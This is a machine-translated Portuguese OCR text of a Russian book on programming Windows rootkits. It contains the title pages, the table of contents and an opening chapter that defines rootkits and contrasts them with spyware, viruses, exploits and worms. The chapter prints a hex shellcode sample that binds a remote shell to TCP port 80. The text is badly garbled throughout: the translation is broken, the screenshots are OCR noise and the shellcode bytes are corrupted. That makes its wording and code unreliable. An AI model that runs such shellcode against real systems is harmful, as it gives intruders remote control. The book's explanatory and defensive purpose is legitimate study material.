
Excretar 
J para W I N D O W S 
Teoria e prática de programação 
"Caps invisíveis", 
permitindo se esconder do sistema 
dados, processos, conexões de rede 
Editor

pagina: 1

Kolisnichenko D.N. 
Rootkits 
Em Windows 
Teoria e prática de programação 
"Caps invisíveis", 
Permitindo se esconder do sistema 
Dados, processos, 
Conexões de rede 
Ciência e Tecnologia, São Petersburgo 
2006

pagina: 2

Kolisnichencode.N.
Rootkits para Windows.Teoria e prática da programação "Hats-Nevi
Dikm ", permitindo ocultar dados, processos, rede do sistema
compostos.- São Petersburgo: Ciência e Técnica, 2006. - 320 S: IL.
ISBN 5-94387-266-3
Série "Segredos de domínio"
Rutkin é um programa ou um conjunto de programas para controle oculto
sistema hackeado.Na plataforma Windows, o sigilo é garantido pelo fato de que
Rutkuts intercepta as funções e estruturas do sistema de dados, substituindo -as
eles codificam e dados.Graças a esta substituição, Rutkit pode disfarçar
O segmento no sistema de processos estranhos, arquivos, conexões de rede, chave
cujo registro, etc., agindo como um tipo de software
Caps invisíveis.
Descrever as tecnologias de rotina e a programação dos rutkuts é precisamente e dedicada
Para este livro.O primeiro capítulo do livro examina várias rotas populares.
Os capítulos a seguir apresentam o leitor aos princípios do trabalho de Rutkin.Dado
Numerosos exemplos de código ilustrando várias tecnologias de rotina
GII.
O livro foi projetado para programadores do nível médio de preparação que pode
Escreva sobre C/C ++ e conhecidos com o básico da programação de rede.Ela vai ser
Também é interessante para todos que querem entender os recursos do sistema operacional Windows,
Saiba mais sobre as possibilidades de hackers e proteção.
Entre em contato com os telefones da editora:
(812) 567-60-25, 567-70-26
(044) 516-38-66, 559-27-40
Site oficial www.nit.com.ru
o h p - \ 1 '
Y -
7 -
>! •} i
® D-N-Kolisnichenko
ISBN 5 - 9 4 3 8 7 - 2 6 6 - 3
© Science and Technique (Original-Makt), 2006

pagina: 3

CONTENTE 
Capítulo 1. Hard of View of the Cracker 
9 
1.1.Quem e por que hackear proteção 
onze 
1.2.O que é Rutkit 
12 
1.3.O que não é Rutkit 
14 
1.4.Nem todo código oculto é rutkit 
18 
1.5.Hardware e software rutkin 
22 
1.5.1.Hardware e software Rutkin - Artilharia pesada 
22 
1.5.2.Sniffers de rede 
24 
1.5.3.Sniffers do teclado 
25 
1.6.Conhecer a luta 
26 
1.6.1.As rotas mais populares 
26 
1.6.2.Princípios gerais do trabalho de Rutkin 
27 
1.6.3.Rutkin Hacker Defender 
trinta 
CAPÍTULO 2. TODO -UP do ponto de vista do administrador 
33 
2.1.Prevenção 
34 
2.1.1.Criando uma conta de usuário comum 
35 
2.1.2.Instalação de antivírus 
36 
2.1.3.Instalação do firewall 
38 
2.2.TRATAMENTO 
43 
2.3.Detecção de Rutkin significa 
44 
Sistemas de detecção de invasão local 
45 
Sistemas de detecção de invasão 
45 
2.4.Detectores de Rutkin 
46 
Luz negra 
48 
Rootkitrevealer 
49 
Utilitários úteis 
49 
http://www.invisiblethings.org 
52 
Vice: Scanner de tecnologia Ratkitte 
53 
Processuard e antihook: prevenção de invasão 
55 
3

pagina: 4

Rootkits 
Para forense: Encase e Tripwire 
56 
Capítulo 3. Crazy como um estilo de vida de Rutkita 
59 
3.1.Substituição de código 
60 
3.1.1.Modificação do código -fonte 
60 
3.1.2.Patching 
61 
3.2.Interceptação no nível do usuário 
63 
3.2.1. 
Recarregar 
Endereços 
funções 
66 
3.2.2. 
Recarregar 
você mesmo 
funções 
66 
3.3.A introdução do código Rutkit no processo de outra pessoa 
69 
3.3.1.Chave APPLNIT_DLLS 
69 
3.3.2.Interceptação do Windows 
70 
3.3.3.Fluxos remotos 
73 
3.4.Patching "em tempo real 
74 
3.4.1.É uma função? 
76 
3.4.2.Onde voltar? 
80 
3.5.Explorit e Rutkit tocam juntos 
84 
3.5.1.Carregando Rutkin para um computador remoto 
84 
3.5.2.Lançamento de Rutkin em um computador remoto 
85 
3.5.3.NTA (Aplicativo HTML): O que é? 
87 
Capítulo 4. Conhece com as tabelas do sistema 
93 
4.1.Modos de operação do processador 
95 
Modo real 
95 
Regime protegido 
96 
Modo virtual 
96 
Modo de gerenciamento do sistema 
97 
4.2.O poder dos anéis 
97 
4.3.Transição para o modo seguro 
98 
4.4.Organização da memória no modo protegido 
99 
4.4.1.Introdução a uma organização segmentada de memória 
99 
4.4.2.O descritor do segmento 
101 
4

pagina: 5

Contente
4.4.3.Tabelas de descritores
103
Tabela GDT
103
Tabela LDT
104
4.4.4.Sortia abordando
105
4.4.5.Catálogos e tabelas de página
107
Estruturas de dados que controlam o endereço da página
107
Cálculo do endereço físico
108
Records de PDE e boca
110
4.5.Tabela de transcriptores de interrupções (yut)
112
4.6.Estrutura SSDT
114
4.7.Limitando o acesso a algumas tabelas importantes
114
4.8.As funções mais importantes do sistema operacional
115
4.8.1.Gerenciamento de processos
116
4.8.2.Fornecendo acesso a arquivos
118
4.8.3.Gerenciamento de memória
119
4.8.4.Segurança
119
Capítulo 5. Escreva o primeiro driver
121
5.1.DDK (Kit de Desenvolvimento de Motoristas)
123
5.2.Fontes e arquivos makefile
124
5.3.Assembléia do motorista
125
5.4.Depuração.DebugView Utility
126
5.5.Carregando do motorista
126
5.6.Pacotes de solicitação de entrada/saída
135
5.7.Esquema de dois níveis rutkin
141
Capítulo 6. Intercepção no nível do núcleo
145
6.1.Interceptação de intercessão (tabela)
148
6.2.Instrução de Syssenter
151
6.3.Processos de fechamento (tabela SSDT)
152
6.3.1.Proteção à mesa SSDT e Rutkin
153
5

pagina: 6

Rootkits
6.3.2.Alterar SSDT
156
6.4.Ocultação de conexão (tabela IRP)
161
6.5.Drivers de vários níveis
170
6.5.1.Como o Windows funciona com drivers
172
6.5.2.IRP e pilha de entrada/saída
173
Capítulo 7. Escreva o teclado para o teclado
177
7.1.Registro da natureza da garra do filtro
178
7.2.Lançamento de uma tecla de protoculação de fluxo separada
180
7.3.Processando a leitura do teclado IP.P
183
7.4.Escrevendo chaves interceptadas para um arquivo
185
7.5.Montagem de sniffer
189
7.6.Teclados prontos -feitos
190
Capítulo 8. Oculto de arquivo
191
Capítulo 9. Recarregamento
203
9.1.Visão geral dos métodos de carregamento automático Rutkin
204
9.2.Segredos de re-arquivos
205
9.3.Um pouco sobre BIOS
207
9.3.1.Memória flash
209
9.3.2.Experimento malsucedido.O que fazer?
211
Capítulo 10. Rutkit corresponde ao proprietário
215
10.1.Canais secretos
216
10.1.1.O que vamos transmitir?
216
10.1.2.A chave para segredo - Steganografia
218
10.1.3.Escondemos os dados em verificações de DNS
220
10.2.Vamos ao nível do núcleo.Interface TDI
222
10.2.1.Descritor de endereço de transporte
224
10.2.2.Abrindo o contexto da conexão
227
6

pagina: 7

Contente 
10.2.3.Conectamos o endereço de transporte e o contexto da conexão 
228 
10.2.4.Combinar 
230 
10.2.5.Trocamos dados 
232 
10.2.6.Terminamos a conexão dos recursos 
234 
Capítulo 11. Interface NDIS.Criação de uma rede Tonshffer 
237 
11.1.Registro do protocolo no sistema 
239 
11.2.Formação do fluxo das funções do protocolo 
242 
11.3.Análise de pacotes 
247 
Capítulo 12. Rutkin híbrido 
251 
12.1.O que é raiz híbrida? 
252 
12.2.Implementação de Rutkin 
252 
Capítulo 13. Tecnologia DKOM 
259 
13.1.Vantagens e desvantagens dkom 
260 
13.2.Determinação da versão do Windows 
263 
13.2.1.Função da API getVersion 
263 
13.2.2.Funções do modo núcleo 
264 
13.2.3.Registro do sistema 
265 
13.3.Interação do driver do dispositivo e processo do usuário 
266 
13.4.Hiding Processos usando DKOM 
269 
13.5.Drivers de conexão de dispositivos 
274 
13.6.Problemas de sincronização 
276 
13.7.Obtendo privilégios adicionais 
279 
13.7.1.Privilegias Token 
279 
13.7.2.Mudando privilégios 
281 
13.7.3.Como você trabalha por privilégios de Rutkitri 
285 
13.7.4.Adicionando SID ao token 
290 
7

pagina: 8

Capítulo 1. Hacking do ponto de vista 
Biscoito 
Quem e por que hackear proteção 
O que é Rutkit 
O que não é Rutkit 
Nem todo código oculto é rutkit 
Hardware e software rutkin 
Conheça - Rootkuts 
Rootkits

pagina: 10

Capítulo 1.
1.1.Quem e por que hackear proteção
Hackear um sistema não é uma tarefa muito fácil que precisa ser gasta
Muito tempo.E quanto mais sério o sistema de proteção, mais
Meni (e, possivelmente, fundos) precisa ser gasto em seu hack.Uma vez que um homem é trapaceiro
Titus tempo, dinheiro, o que significa que ele tem um certo objetivo.O que os impulsiona?
Quais são seus motivos?
•
Um dos motivos mais comuns é hackear
hacking.Geralmente esse motivo move o guindaste no início de seu
Pier, quando o cracker ainda estuda e usa hackers como um meio de SA
MO -Affirmation.Nesta fase, ele não se importa com o que hackear - seu
Sistema ou servidor da Microsoft.O principal é que o sistema será invadido
e o cracker receberá satisfação moral disso - ele percebe
Seu significado começará a acreditar em sua força.Muito provavelmente ele é você
leva com precisão o seu sistema, não o servidor da Microsoft, porque o transporte
Sua mãe é mais fácil e o cracker iniciante seguirá o caminho do menor
Resistência.Ele começará a tomar a "taxa" por hackear mais tarde, quando
Ele irá para o próximo passo em seu desenvolvimento.
•
O segundo, não menos comum, a razão é o recibo
recompensa material.Talvez em seu servidor
(computador) Há informações para as quais o cracker prometeu
Bom pagar.Ou talvez o cliente de hackers seja necessário
Destrua seu sistema excluindo todos os dados.
•
A terceira causa de hackers é o uso dos recursos do seu sistema
para processar os dados do conversor ou para atacar outros sistemas.Hacking
Mav seu sistema, o cracker define um programa nele, que
começará a executar as ações de que precisa imediatamente após a instalação
Ou em sua equipe.
•
O próximo motivo é a vingança.Na maioria das vezes, esse motivo é
pode ser demitido funcionários, geralmente administrações de sistema
Torá.Essas pessoas conhecem os lugares vulneráveis ​​do sistema perfeitamente e podem
Antes de sair, instale diferentes programas que lhes permitem
Por um longo tempo para serem atendidos pelo sistema.
O que o cracker faz no seu sistema depois de invadir?Depende de seus motivos.
Se o cracker invadir seu sistema apenas para hackers, provavelmente
Tendo invadindo o sistema, ele vai parar por aí.Talvez ele vá para o sistema
mais algumas vezes e copia um arquivo dois para provar a si mesmo
Esse hacking foi um sucesso, após o que ele esquecerá de você e mudará para ataques
outro sistema.Ou talvez ele sinta poder, ele cederá à tentação
onze

pagina: 11

Rootkits 
Vandalismo: ele quer fazer qualquer coisa com o sistema - até a destruição
todos os dados.Alguns têm vandalismo ao longo do tempo, e outros
O centeio invadirá e destruirá os sistemas até a velhice. 
A penetração no sistema de um cracker iniciante é fácil de detectar.Depois 
Isso é necessário, sem se preocupar, para prestar mais atenção, segurança, 
Então, da próxima vez, ele não conseguiu invadir. 
Se o cracker precisar de informações armazenadas no seu computador, então 
Muito provavelmente, ele copiará e tentará "cobrir traços" - destruir 
evidência de sua presença para que você não adivinhe que o sistema 
foi hackeado.É verdade, alguns não particularmente qualificados, biscoitos, 
Sem saber o que exatamente está sujeito a remoção, eles apagam tudo em uma fileira, o que pode 
levar às mesmas consequências que o ataque do vandalista. 
Se o cracker apreciar os recursos do seu sistema para processar seus dados
o desempenho de seus aplicativos, a produtividade, 
Pode diminuir seriamente.Reduza o desempenho do seu sistema 
Caster também pode pedir seu concorrente - por exemplo, para ligar 
Insatisfação com seus clientes.Tais ataques são chamados do ATAMI (negação 
de serviço ou recusa de serviço).Geralmente com Dos-Atak, reduzido
Existe uma taxa de transferência de rede, a carga no processador aumenta, 
Muitos processos desnecessários são gerados, o que causa falta de memória, etc. 
A perda de dados também é possível para levar o sistema aos sentidos 
Você precisará redefinir. 
Por outro lado, seus recursos podem precisar de um cracker para
Anonimato para o anonimato: em seu sistema e em seu nome, será danificado
Outros sistemas.Nesse caso, nada o ameaça por algum tempo, 
Porque o cracker precisa de um sistema de trabalho.Espero que você tenha tempo 
Para encontrar sua presença até que o irreparável acontecesse. 
Se a vingança se vingar, o que significa que na maioria dos casos você pode corridas
Diga adeus aos seus dados. 
1.2.O que é Rutkit 
Para garantir a oportunidade de revelar o sistema que 
Você hackeou, você precisa instalar um utilitário de controle oculto lá 
(Porta dos fundos).Mas se o usuário (o administrador do sistema) suspeitará que 
Seu computador (ou rede) é hackeado, ele verificará imediatamente, não instale
São esses utilitários, ou seja, o invasor continua a usar
Sistema.Portanto, o backdoor deve ser "invisível". 
12

pagina: 12

Capítulo 1. 
Na internet, você pode encontrar muito utilit de backdoor (vou ligar, por exemplo, 
Netbus popular e orifício traseiro), mas a maioria deles não sabe como
É bom esconder sua presença.Além disso, muitos se desenvolverão
Chiki backdoor'ob tente adicionar o máximo possível aos seus programas 
Funções, muitas vezes não está claro por que as necessárias.Bem, por exemplo, por que seriamente
Para o cracker, a função da abertura remota da bandeja de CD-ROM?Por causa 
Diversão?Sim, você pode tirar sarro dos colegas no trabalho, mas nada mais. 
Para um ataque profissional, você precisa de um programa profissional - 
um programa que desempenha apenas uma função e não o faz mais 
nada extra.Lembre -se, quanto mais simples o sistema, mais confiável é. 
A utilidade do controle oculto do computador deve ser invisível naquele 
Número para agentes antivírus.Significa destinado a capuzes
A presença da presença no sistema de código estranho são chamados de rotas 
(Rootkit). 
O termo "rootkit" uls por mais de dez anos.Ele veio do mundo Unix, onde a raiz está 
usuário com os mais altos poderes;Kit é um conjunto de ferramentas, 
Assim, o rootkit é um conjunto de programas que permitem o cracker do chão
Leia o controle total sobre o sistema hackeado e evite o seu 
detecção. 
Cada programa no Rutkita realiza seu próprio, claramente definido 
Funções, diferentemente dos programas de backdoor nos quais existem muitos desnecessários. 
O componente mais importante de qualquer rootkit são os programas, escondendo
A presença no sistema da vítima de um código estranho (por exemplo, código 
qualquer programa de backdoor), dados (arquivos, catálogos, chaves 
registro), processos, etc. 
Freqüentemente, programas que fornecem acesso remoto a uma vítima vitoriosa 
(backdoor) ou ouvindo pacotes na rede, também incluídos 
Rutkin.Deve necessariamente conter fundos que "cobrem" 
Todo Rutkin como um todo: arquivos e catálogos que você indica.Geralmente fung
Rutkita Ksium não se limita a uma simples ocultação de arquivos e processos: 
Um bom rootkit pode ocultar as chaves do registro, conexões de rede, 
Drivers de dispositivos, isto é, fazem tudo para que o administrador do sistema não seja 
descobriu sua presença. 
Eu não quero que você tenha a impressão de que Rutkit é ruim, 
Esse rutkin é usado apenas para executar ações ilegais. 
Rutkin é apenas uma tecnologia que pode ser usada como 
"Ruim" e "bom".Componentes Rutkin por funcionalidade 
Não é diferente dos programas decentes: ssh e telnet, como backdoor, 
Sirva para acesso remoto ao sistema;Snifffers (monitores de rede) 
13

pagina: 13

Rootkits
frequentemente usado por administradores de rede e programas de rede
TAMI para análise de pacotes transmitidos pela rede.Os administradores podem
Use -os mesmo para combater os biscoitos!
Rutkuts no sentido adequado Algumas empresas são especificamente boca
Eles estão fechados para as estações de trabalho de sua rede para controlar seus
funcionários e agências policiais ocidentais e serviços especiais - em
Computadores de suspeitos em crimes.
1.3.O que não é Rutkit
Antes de iniciar uma conversa sobre o que é Rutkin, você precisa entender
Thread para si mesmo do que não é.Vamos falar sobre as semelhanças dos rutkuts com conhecido
Meus tipos de programas e diferenças prejudiciais deles.
Em primeiro lugar, Rutkit não é um espião.Programa de espionagem
(Spyware) é chamado de um que registra tudo o que faz no computador
Usuário TIR: o que ele entra no teclado (incluindo senhas),
O que os aplicativos lançam, etc. Um exemplo de um programa desta classe de MO
pode servir a gancho.
Recentemente, a ameaça de programas de espionagem tornou -se muito relevante.Esses
Programas sem o conhecimento do usuário coletam informações sobre as visitas
Usuário de páginas da web sobre instalado em seu computador em
Objetivos, sobre seus dados pessoais (por exemplo, chaves eletrônicas de pagamento
sistemas) e envie tudo isso para o terceiro lado.
Os espiões também podem alterar os textos de mensagens postais, arquivos para grata
Disco TCC e até ajuste as páginas exibidas pelo navegador.Exceto
Togo, a atividade versátil do spyware leva muito
Surses, que reduzem o desempenho do computador.Geralmente espião
Os programas são integrados com navegadores da Web ou programas de concha
(como o condutor do Windows), o que dificulta a remoção do sistema.
O maior número de spyware é escrito para o navegador do Internet Explorer, então eu
Aconselho você a mudar o navegador para ópera ou mozilla.
Os desenvolvedores de Rutkita aproveitaram os achados dos autores do espião
programas e rotas modernas também são capazes de protocolo
Ações do usuário.Mas seu principal objetivo não está nisso, mas na lã
TII de tais protocolos e outras ações hostis.
Em segundo lugar, Rutkit não é um vírus, embora saiba como se esconder de
Meios de detecção (antivírus) usando métodos clássicos
RUSOV: Modificação de tabelas do sistema, memória e lógica de software.
14

pagina: 14

Capítulo 1.
Ao contrário dos vírus, os rutkitianos não se multiplicam.Outra diferença é
O fato de o vírus ser completamente autônomo, Rutkita obedece humana
Ku, que o instalou.Vírus geralmente danificam dados, rutkit
Apenas ajuda o cracker a permanecer despercebido.Exclua dados MO
Uma pessoa que é controlada por Rutkit, o próprio Rutkit está sob o controle
Isso nunca fará isso.
O Windows era considerado um nativo de vírus, mas com o advento em 1996
Versões do Windows NT 4.0 tudo mudou.Comparado ao Windows 95, neste
O sistema operacional mudou o modelo de memória: usuário comum
Os programas não podiam mais modificar as tabelas do sistema.PA
Não havia vírus capazes de começar no Windows NT, e mesmo este
hora, graças a um sistema de segurança aprimorado, vírus para o Windows NT
Marly menor que o Windows 9x, onde eles apenas estão repletos.
As soluções usadas no NT4 melhoraram e migraram para
Windows XP, mas, em paradoxalmente, o número de vírus é escrito
NYE sob XP, aumentou.O fato é que o Windows XP não foi projetado para
profissionais e em usuários domésticos.A maioria deles é constantemente
trabalhar sob a conta do administrador, negligenciando os requisitos
segurança, segundo a qual em nome do administrador você pode cumprir
apenas tais ações para as quais os poderes do comum
Usuário: alterando a configuração do sistema (por exemplo, instalação
dispositivos), instalação de programas, configuração de rede, etc.
O trabalho usual deve ser realizado em uma conta regular para que
Código malicioso que penetra no sistema não recebeu administrador
privilégios.Eu me arrependo, eu mesmo não cumpro minhas próprias recomendações: escrevo estas
Linhas na conta do administrador.Eu posso justificar o ska
Só que eu lancei o firewall do posto avançado, Kaspersky e eu
Eu dirijo o sistema riodicamente através da AVZ e Antispyware.Claro que isso não é
O limite de segurança, mas ainda melhor do que nada.
Além disso, Rutkit não é uma exploração e não é um verme para falar um pouco
Continue com essas variedades das armas do tanque.
Na internet naquela época, o UNIX OS reinou, que foi considerado uma das vendas
Sistemas operacionais seguros.A fonte de sua confiabilidade é
Restrição dos direitos do usuário ao acesso a estranhos, incluindo sistêmico,
arquivos.O código malicioso obedece às mesmas restrições que
Vatel, em cujo nome é lançado, portanto, com a administração certa
O vírus não pode causar danos significativos ao sistema UNIX.
Ao mesmo tempo, acreditava -se que os vírus para o Unix eram impossíveis.
15

pagina: 15

Rootkits 
No entanto, não há sistemas operacionais completamente invulneráveis: Unix 
conseguiu hackear usando a vulnerabilidade do
Suporte de Gram.O princípio é o seguinte: Programas-Servers 
(Postal, www, ftp, telnet, ssh e outros) são lançados, geralmente com 
Poderes máximos, isto é, com os privilégios da raiz do usuário. 
Se esse programa estiver vulnerável - por exemplo, é processado por engano
O buffer é metade do caminho - o cracker pode usá -lo para iniciar seu código 
Em um computador remoto.Para fazer isso, basta transferir a linha para o servidor 
Os comprimentos são maiores que os permitidos.Este código será executado com privilégios
Yami lançou seu processo, o cracker receberá controle total 
Acima do sistema. 
Instruções que os registros de cracker no buffer são chamados 
Código do shell.Por exemplo, o próximo código chama o shell,
Costura de conexões TCP através da porta 80: 
\ x31 \ xdb \ xf7 \ xe3 \ xb0 \ x66 \ x53 \ x4 
3 \ x53 \ x43 \ x53 \ x8 
9 \ xel \ x4b \ xcd \ x80 \ 
\ x8 
9 \ xc7 \ x52 \ x66 \ x68 \ x00 \ x50 \ x4 3 \ x6 
6 \ x53 \ x8 
9 \ xel \ xb0 \ xl0 \ x50 \ x51 \ 
\ x57 \ x89 \ xel \ xb0 \ x66 \ xcd \ x80 \ xb0 \ x66 \ xb3 \ x04 \ xcd \ x80 \ x50 \ x57 \ 
\ x8 
9 \ xel \ x4 
3 \ xb0 \ x66 \ xcd \ x80 \ x8 
9 \ xd9 \ x8 
9 \ xc3 \ xb0 \ x3f \ x4 
9 \ xcd \ x80 \ 
\ x41 \ xe2 \ xf8 \ x51 \ x68 \ x6e \ x2f \ x7 
3 \ x68 \ x68 \ x2f \ x2f \ x62 \ x6 
9 \ x8 
9 \ xe3 \ 
\ x51 \ x53 \ x8 9 \ xel \ xb0 \ x0b \ xcd \ x80 
Naquela época, muitos serviços do UNIX não estavam protegidos do transbordamento 
buffer, o que significava que uma pessoa experiente poderia invadir praticamente 
qualquer sistema Unix, já que todos tinham o mesmo buraco na segurança
mas. 
Programas que operam vulnerabilidades desse tipo, e chamadas
são explosões.Eles servem como um meio de entrega de um código estranho para 
Um carro que tem uma certa vulnerabilidade e inicia -o nesta máquina. 
Com o advento das façanhas, o hacking do sistema UNIX tornou -se capaz de fazer qualquer um, mesmo 
Não é muito qualificado, o usuário.Tudo o que é necessário para hackear 
- Isso está buscando o scanner de porta para procurar um sistema, vulnerável a certos 
maneira, inicie a exploração apropriada. 
Por uma questão de justiça, deve -se notar que as vulnerabilidades na correção do Unix
Eles são prontamente prontamente, mas nem todos os administradores de sistema de
Skat atualiza seus sistemas.Além disso, Ten apareceu recentemente
use a densidade para penetrar no sistema de vulnerabilidade, sobre o qual 
O programa que descobriu a invasão do So -Challed “ 
Vulnerabilidade do dia zero: hoje um buraco foi descoberto e hoje, enquanto 
Os desenvolvedores não tiveram tempo para liberar o patch apropriado, hackeado 
sistema. 
16

pagina: 16

Capítulo 1. 
Outro tipo de programas usando vulnerabilidades bem conhecidas 
Servidores são vermes (vermes).Eles são mais autônomos que as façanhas: Worm 
Equipado com um scanner de rede e verifica os computadores de rede quanto à presença
vulnerabilidade dividida.Tendo descoberto um buraco, ele copia seus arquivos em quem
Pucter-sacrifício e se lança neste computador.Então o ciclo de POS
Ele escurece - o worm novamente digitaliza a rede e procura computadores com vulnerabilidade. 
Ao mesmo tempo, ele marca todos os computador infectados para evitar 
re -infecção. 
Um verme em um computador infectado pode executar comandos 
Lançando seu cracker.Por exemplo, ter infectado centenas de computadores de 
redes diferentes e até de diferentes regiões geográficas, você pode organizar 
Negação de serviço distribuída distribuída) 
Servidores Quando, sob o comando do cracker, todos esses computadores começam a adormecer 
O servidor com solicitações, paralisando seu trabalho.Descubra a fonte do ataque ao mesmo tempo 
impossível. 
O autor do primeiro verme foi Robert Morris.Em 1988, ele escreveu um verme, 
que foi distribuído pela rede usando vulnerabilidades em programas 
Sendmail e 
Fingerd. 
Este verme se espalhou rapidamente por toda a Internet, 
que em 1988 consistia principalmente de universidades e regras
Telty/Institutos Militares.Ele trabalhou o verme assim: ele se conectou a 
O computador no qual o programa Sendmail foi lançado, então é você
Liguei para o modo de comando do programa (essa era a vulnerabilidade do Sendmail que 
tempo), que permitiu que qualquer comandos fosse executado. 
Esses comandos causaram um pequeno programa que se transferiu para quem
PUCTER-SACRIFFICE Todos os arquivos necessários.Se com sendmail "frono" 
Não foi bem -sucedido, o verme causou o transbordamento do buffer no Demônio dos dedos com
Despeje a conquista do mesmo resultado: o worm deve ser lançado em 
Machine-victim. 
Tendo atingido o gol, o verme de Morisa repetiu o ciclo, começando com tentativas 
Registro em outros computadores usando RSH (Shell Remote) e Rexec 
(Execução remota).Ele selecionou senhas no dicionário/usr/doutor/palavras. 
O verme se espalhou pela internet a uma velocidade que alguns 
Carros foram infectados várias vezes, porque Morris não era
Eu ousei a oportunidade de um verme marcar computadores infectados. 
Rutkit é semelhante a um verme com isso, tendo chegado a um computador de sacrifício, espera
Mand do proprietário e os executa;No entanto, diferentemente do worm, ele não infecta 
Outros computadores estão em sua própria iniciativa.Explorar enquanto serve 
Apenas uma ferramenta para uma instalação não autorizada do rutkit a ser removida
carro novo.O cracker não pode saber com antecedência quais lacunas no destaque 
17

pagina: 17

Rootkits 
O administrador não fechou o sistema de hackers, então ele tem à mão 
Deve haver dezenas de diferentes façanhas destinadas a diferentes vulnerabilidades
pontes.E todo esse arsenal serve para instalar um único 
Rutkin. 
Repito que o Rutkit é um programa ou um conjunto de programas, o principal
cujo valor é a organização da entrada de backdoor para o sistema e com
Enrolando esta entrada e atividade nela dos meios de detectar
Código Tel (antivírus, etc.).Para alcançar esses objetivos em Rutkutka 
Existem soluções emprestadas de vírus e espiões, mas não ex
Patos: Rutkin pode usar funções de ópera minúsculas
um sistema de sanção, mas de forma alguma vulnerabilidade no software 
(Por exemplo, Rutkin nunca causará o transbordamento do buffer). 
Para fornecer ao cracker controle total sobre o sistema, 
Rutkin deve acessar o núcleo.Componente de rotina trabalhando em 
Nível do núcleo, desliza os dados falsos do núcleo (modifica 
Tabelas) para ocultar seus processos e arquivos.Este componente é possível 
Carregue com uma exploração que causa o transbordamento do buffer em 
O tempo de carregar o sistema e iniciar o Rutkin Bootloader.Outra maneira 
Obter acesso ao núcleo é a instalação do componente do kernel Rutkit como 
Drivers do dispositivo.Se o motorista trabalhar no anel de processador zero, 
Será muito difícil detectar rootkit. 
Falaremos mais sobre os anéis do processador nos capítulos seguintes, e este
Uma hora será suficiente para dizer que o processador possui 80386 (e mais tarde
Siy, até o último Pentium), existem quatro níveis de proteção, chamados
Anéis de defesa: de 0 a 3. Operando 
O sistema é um nível com os direitos de acesso máximo.Operativo 
O sistema pode descartar os níveis de acesso a seu critério, mas 
Geralmente o núcleo é realizado em 0 anel e aplicou programas no anel 
Com o número 3. 
1.4.Nem todo código oculto é rutkit 
Outro exemplo de código oculto é os "ovos de Páscoa", tão chamados, 
Isto é, capacidades ocultas e sem documentos de uso comum
Tel Program. 
Os programadores adoram perpetuar seus nomes no programa 
Verdadeiros criadores.Afinal, de acordo com a lei, direitos autorais 
O software não pertence aos desenvolvedores, mas à empresa, 
que eles trabalham, então na janela "no programa" será escrito 
18

pagina: 18

Capítulo 1. 
"Cerca de 2005 CJSC" ROG e HOOF CORP. "", e não o sobrenome do verdadeiro AB
o tori deste programa.Autores que não querem se manter desconhecido
perseguir uma mensagem no programa, que aparecerá apenas com o OP
condições (por exemplo, ao pressionar uma certa combinação 
As chaves que ninguém pressiona no modo normal). 
Os desenvolvedores da Microsoft gostam de se entregar a funções especialmente ocultas. 
Todo mundo conhece ovos de Páscoa do pacote do MS Office, protetores de tela (protetores de tela) em 
Windows 98. Agora vá para o computador, execute o Word e o Ven
Dit = rand (100) e clique em "Enter".O resultado é apresentado na FIG.1.1. 
arquivo 
Edição 
Frid 
Vost^olho 
Kitsat 
Serviço 
1ablitsa 
£ kpa 
Referência 
j j d i j l?& * "EU / •
"-C -J A, C
a 
. 
.GS "New Rtrfnan 
- 12 
-: f para n ^ z ё 3 
E 
Q 3 se 100% -: th 
_Int "e, b. 
5 £ g.i- a - r - a - l 
AS1*1 
| 
Frdnduz.h, ^ 
Sisshcheshche. 
chá. 
C^d-dgtkh.thikh,^gkkkhkh.franpudskd> :( 
Fri e g d e x ^ u l o ^ y a v s p ^ y h ^ 
Com^ry^egnbatsh.Sim, assando chá., Senhor. 
O francês.Bebida. 
Ysh^ 
^bs.gi.eshs desses macios :;F. Wranz? 
Smeil £ escovado 
Fv? 
F^Anduz^bulO^sim^Opeda 5, S^ts .. ainda d T d x.M i g.K e x ^ 
Chl1y, sier^ph "; ngn>;, meakk; 1x pão francês, sim. 
Sente -se 
Fdadz yjc k e x b u 
L sobre 
K, D e S, chá. 
FORSHDDCHI DESTES. 
puro.^ 
Frenchmankhdulok, d e beba chá .. £> $ ^ $ i ^ in & ^ p w d francês; 
chá ... s/b. 
C^e, sh11..eid?. ?? Tikh..m^dich%. 
Francês? 
C> d w k ^ e?T e d d g 1 i g ^ ^ ^ 
Comer.Estes são aqueles que são iminentes 
Francês? 
S -E D S é um pão francês sujo, sim melões. 
chá .. s^coma^still/;Estes, b1lgkdh dos peitos franceses^sim.S_eil =.] Perto? 
FRADSUZSKDH^UKOK.Sim.Beba, cap 
£ bdl., E.> -P; 
Francês, Rolls, sim.Eu dou ....Eida desses aresigkid .f ^ altsuz.s ^ 11x b u l o y ^ s p ^. 
chá.Cmmtjtmtm & mww.S> s №jm & i ™ e $ mm, 
FR1SHUZRK^ya.6.ol^., Sim., Ezpech. 
Rolinhos franceses e oitenta chá ...D e v. 
chá^ 
Coma ainda ,? ,? 
Você é.Estes também são macios. 
Bkshgtm^t, 
&* Chá rpsh. 
Coma. 
Frdkezskn;^ 
A granel, deixe tomar um chá, coma esses pincéis de Iyagkn: francês. 
chá, 
SD, ainda 
No gene 
Art 1 
Código 1 
-;^i e: l 'b. 
Inglês 
Carvão 
" 
' 
•• ' 
E 
C: 
Arroz.1.1.Um presente da Microsoft 
Você está interessado?Então vamos relaxar um pouco e considerar um par de Páscoa
ícones da Microsoft.Se você não tiver tempo para isso, pode com um limpo 
Consciência vá para o próximo ponto. 
Vá para a pasta de fontes no painel de controle.Clique em "Ctrl" + "A" e para
Aqueles "alt" + "entram".Em teoria, você terá que ver o volume total, 
ocupado por todas as fontes.Mas, em vez disso, bastante vai se abrir 
Propriedades - uma para cada fonte.O único não é
Uma variedade de momentos - você terá que fechá -los por um longo tempo. 
19

pagina: 19

Rootkits 
você mesmo 
Com 
'.'. 
<l^| l1z | 
milímetros 
Sh 
-Hshh " 
Yaimnyshashishd^w 
SOBRE
b
sch
E
E 1 
Tipo de arquivo: 
Escorregou *** 
Colocação 
Tamanho: 
Não disco: 
Criada: 
• mudado; 
Abrir; 
Atributos; 
1 dtgdsgg 
Arquivo de fonte 
**^|Programa de visualização Shcheift: 
Tirar., Assim, 
C: \ wimx) WS \ fontes 
24,2 KB (24 8S2 bytes) 
32,0 kb (32 768 bytes) 
16 de agosto de 2005, 22:20:38 
21 de outubro de 2001, 1:00:00 
15 de novembro de 2005 
"
™ apenas "preguiçoso 
R Hidden G "Arquivo 
OK 
~] 
Cancelamento 
J. 
"EU 
^
T
^ 
J. 
Arroz.1.2.Outro 
presente 
